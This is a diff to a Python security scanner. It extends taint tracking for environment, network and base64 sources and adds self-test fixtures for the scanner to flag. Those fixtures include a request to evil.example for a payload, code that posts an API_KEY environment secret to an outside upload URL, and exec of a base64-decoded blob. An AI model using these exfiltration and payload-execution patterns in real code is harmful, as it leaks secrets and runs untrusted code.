@@ -449,6 +449,30 @@ class PyAnalyzer:
                 return True
         return False
 
+    def _net_in(self, node) -> bool:
+        """True if ``node`` carries a network-result source or references a
+        net-tainted name, recursing through container literals. Mirrors
+        ``env_in`` for the network taint kind (SEC-006)."""
+        if node is None:
+            return False
+        for sub in ast.walk(node):
+            if self.is_net_result(sub):
+                return True
+        return False
+
+    def _b64_in(self, node) -> bool:
+        """True if ``node`` carries a base64-decode source or references a
+        b64-tainted name, recursing through container literals. Mirrors
+        ``env_in`` for the base64 taint kind (SEC-007)."""
+        if node is None:
+            return False
+        if self.mentions(node, self.b64_taint):
+            return True
+        for sub in ast.walk(node):
+            if self.is_b64_decode(sub):
+                return True
+        return False
+
     def is_socket_ctor(self, node) -> bool:
         """True if `node` constructs a socket: socket.socket(...) /
         socket.create_connection(...), through any aliasing of the module."""
@@ -594,19 +618,20 @@ class PyAnalyzer:
                     continue
                 targets = a.targets if isinstance(a, ast.Assign) else [a.target]
                 names = self._target_names(targets)
-                if self.is_env_expr(v):
+                # A name is tainted when its value carries a taint source,
+                # whether the source appears directly (os.environ,
+                # requests.get(...), codecs.decode(...)) or nested inside a
+                # container literal ({"k": os.environ[...]}, [blob]), or
+                # references a name already carrying that taint. The *_in
+                # helpers recurse through container literals so that, e.g.,
+                # creds = {"token": os.environ["KEY"]} taints ``creds`` and is
+                # still flagged SEC-002 under a host allowlist.
+                if self.env_in(v):
                     self.env_taint |= names
-                if self.is_net_result(v):
+                if self._net_in(v):
                     self.net_taint |= names
-                if self.is_b64_decode(v):
+                if self._b64_in(v):
                     self.b64_taint |= names
-            for a in assigns:
-                v = getattr(a, "value", None)
-                if v is None:
-                    continue
-                targets = a.targets if isinstance(a, ast.Assign) else [a.target]
-                if self.mentions(v, self.env_taint):
-                    self.env_taint |= self._target_names(targets)
             for f in fors:
                 if self.is_env_expr(f.iter) or self.mentions(f.iter, self.env_taint):
                     self.env_taint |= self._target_names([f.target])
@@ -1202,6 +1227,23 @@ SELF_TEST_CASES = [
         "import requests\n"
         "requests.get(\"http://evil.example/payload\")\n",
         ["host:evil.example"], BLOCKED, ["SEC-003", "SEC-107"], [], False,
+    ),
+    (
+        "F8: env exfiltration via dict literal NOT exonerated by host allowlist", "env_exfil_lit.py",
+        "import os\n"
+        "import requests\n"
+        "creds = {\"token\": os.environ[\"API_KEY\"]}\n"
+        "requests.post(\"http://mirror.example/upload\", data=creds)\n",
+        ["host:mirror.example"], BLOCKED, ["SEC-002", "SEC-107"], ["SEC-003"],
+    ),
+    (
+        "F9: exec of base64 payload reassembled through a dict", "b64_dict_exec.py",
+        "import codecs\n"
+        "blob = codecs.decode(\"cHJpbnQoJ2hlbGxvJyk=\", \"base64\")\n"
+        "payload = {\"data\": blob}\n"
+        "data = payload[\"data\"]\n"
+        "exec(data)\n",
+        [], BLOCKED, ["SEC-007"], [],
     ),
 ]
 
